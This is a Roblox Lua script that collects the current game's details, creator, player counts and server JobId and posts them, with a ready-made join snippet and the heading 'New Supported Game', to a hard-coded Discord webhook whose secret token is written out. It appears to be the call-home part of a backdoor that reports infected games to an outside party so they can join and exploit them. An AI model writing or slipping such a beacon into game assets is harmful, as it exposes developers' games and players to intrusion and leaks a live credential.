local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local hook = "https://discord.com/api/webhooks/1449021073847746570/jyztMqMLYbOLUEBFRq8jyDP96sDW1zOXhoEdqdkWO0Z_IcKqy3Y7FXNCF9FdEaLdZ13g"
local gameName = game.Name
local placeId = game.PlaceId
local placeLink = "https://www.roblox.com/games/" .. placeId
local creatorName = game.CreatorType == Enum.CreatorType.User
	and Players:GetNameFromUserIdAsync(game.CreatorId)
	or "Group"
local creatorId = game.CreatorId
local playerCount = #Players:GetPlayers()
local maxPlayers = Players.MaxPlayers
local productInfo = MarketplaceService:GetProductInfo(placeId)
local visits = productInfo.Visits or "N/A"
local genre = tostring(productInfo.Genre) or "N/A"
local favorites = productInfo.FavoritesCount or "N/A"
local copyingAllowed = tostring(productInfo.IsCopyingAllowed) or "N/A"

local payload = {
	["username"] = "Game Logs",
	["avatar_url"] = "https://cdn.discordapp.com/avatars/1448272446414262355/fe0134c803e7a4479963dd939c2e0a27.webp?size=128",
	["embeds"] = {{
		["title"] = "New Supported Game",
		["color"] = 3447003,
		["thumbnail"] = {
			["url"] = "https://cdn.discordapp.com/avatars/1448272446414262355/fe0134c803e7a4479963dd939c2e0a27.webp?size=128"
		},
		["fields"] = {
			{
				["name"] = "Game Information",
				["value"] = "**Game Name:** " .. gameName ..
					"\n**Game Link:** [" .. gameName .. "](" .. placeLink .. ")" ..
					"\n**Join Link:** [" .. gameName .. "](" .. placeLink .. ")" ..
					"\n**Active Players:** " .. playerCount ..
					"\n**Server Players:** " .. playerCount .. "/" .. maxPlayers ..
					"\n**Visits:** " .. visits ..
					"\n**Copying Allowed:** " .. copyingAllowed ..
					"\n**Game Genre:** " .. genre ..
					"\n**Favourites:** " .. favorites,
				["inline"] = false
			},
			{
				["name"] = "Creator Information",
				["value"] = "**Creator Name:** " .. creatorName ..
					"\n**Creator Profile Link:** [ " .. creatorName .. " ](https://www.roblox.com/users/" .. creatorId .. ")",
				["inline"] = false
			},
			{
				["name"] = "Javascript Join Code",
				["value"] = "```js\nRoblox.GameLauncher.joinGameInstance(" .. placeId .. ", \"" .. game.JobId .. "\")\n```",
				["inline"] = false
			}
		},
		["footer"] = {
			["text"] = "Powered by Vanguard"
		},
		["timestamp"] = DateTime.now():ToIsoDate()
	}}
}

local jsonData = HttpService:JSONEncode(payload)
HttpService:PostAsync(hook, jsonData)
